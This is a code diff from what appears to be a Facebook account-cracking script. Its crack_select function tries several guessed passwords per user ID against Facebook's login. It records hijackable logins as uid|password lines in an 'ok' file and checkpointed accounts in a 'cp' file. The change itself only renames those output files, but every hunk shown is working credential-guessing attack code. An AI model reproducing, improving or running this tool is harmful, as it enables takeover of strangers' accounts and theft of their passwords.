@@ -649,14 +649,14 @@ def crack_select():
 			q = json.loads(data)
 			if "access_token" in q:
 				print(" \033[1;32m [Idunil OK] "+uid+" | "+pass1+"\033[0;97m")
-				ok = open("KABIRok.txt", "a")
+				ok = open("ok.txt", "a")
 				ok.write(uid+"|"+pass1+"\n")
 				ok.close()
 				oks.append(uid+pass1)
 			else:
 				if "www.facebook.com" in q["error_msg"]:
 					print(" \033[1;33m [Idunil CP] "+uid+" | "+pass1+"\033[0;97m")
-					cp = open("KABIRcp.txt", "a")
+					cp = open("cp.txt", "a")
 					cp.write(uid+"|"+pass1+"\n")
 					cp.close()
 					cps.append(uid+pass1)
@@ -666,14 +666,14 @@ def crack_select():
 					q = json.loads(data)
 					if "access_token" in q:
 						print(" \033[1;32m [Idunil OK] "+uid+" | "+pass2+"\033[0;97m")
-						ok = open("KABIRok.txt", "a")
+						ok = open("ok.txt", "a")
 						ok.write(uid+"|"+pass2+"\n")
 						ok.close()
 						oks.append(uid+pass2)
 					else:
 						if "www.facebook.com" in q["error_msg"]:
 							print(" \033[1;33m [Idunil CP] "+uid+" | "+pass2+"\033[0;97m")
-							cp = open("KABIRcp.txt", "a")
+							cp = open("cp.txt", "a")
 							cp.write(uid+"|"+pass2+"\n")
 							cp.close()
 							cps.append(uid+pass2)
@@ -683,14 +683,14 @@ def crack_select():
 							q = json.loads(data)
 							if "access_token" in q:
 								print(" \033[1;32m [Idunil OK] "+uid+" | "+pass3+"\033[0;97m")
-								ok = open("KABIRok.txt", "a")
+								ok = open("ok.txt", "a")
 								ok.write(uid+"|"+pass3+"\n")
 								ok.close()
 								oks.append(uid+pass3)
 							else:
 								if "www.facebook.com" in q["error_msg"]:
 									print(" \033[1;33m [Idunil CP] "+uid+" | "+pass3+"\033[0;97m")
-									cp = open("KABIRcp.txt", "a")
+									cp = open("cp.txt", "a")
 									cp.write(uid+"|"+pass3+"\n")
 									cp.close()
 									cps.append(uid+pass3)
@@ -700,14 +700,14 @@ def crack_select():
 									q = json.loads(data)
 									if "access_token" in q:
 										print(" \033[1;32m [Idunil OK] "+uid+" | "+pass4+"\033[0;97m")
-										ok = open("KABIRok.txt", "a")
+										ok = open("ok.txt", "a")
 										ok.write(uid+"|"+pass4+"\n")
 										ok.close()
 										oks.append(uid+pass4)
 									else:
 										if "www.facebook.com" in q["error_msg"]:
 											print(" \033[1;33m [Idunil CP] "+uid+" | "+pass4+"\033[0;97m")
-											cp = open("KABIRcp.txt", "a")
+											cp = open("cp.txt", "a")
 											cp.write(uid+"|"+pass4+"\n")
 											cp.close()
 											cps.append(uid+pass4)
@@ -717,14 +717,14 @@ def crack_select():
 											q = json.loads(data)
 											if "access_token" in q:
 												print(" \033[1;32m [Idunil OK] "+uid+" | "+pass5+"\033[0;97m")
-												ok = open("KABIRok.txt", "a")
+												ok = open("ok.txt", "a")
 												ok.write(uid+"|"+pass5+"\n")
 												ok.close()
 												oks.append(uid+pass5)
 											else:
 												if "www.facebook.com" in q["error_msg"]:
 													print(" \033[1;33m [Idunil CP] "+uid+" | "+pass5+"\033[0;97m")
-													cp = open("KABIRcp.txt", "a")
+													cp = open("cp.txt", "a")
 													cp.write(uid+"|"+pass5+"\n")
 													cp.close()
 													cps.append(uid+pass5)
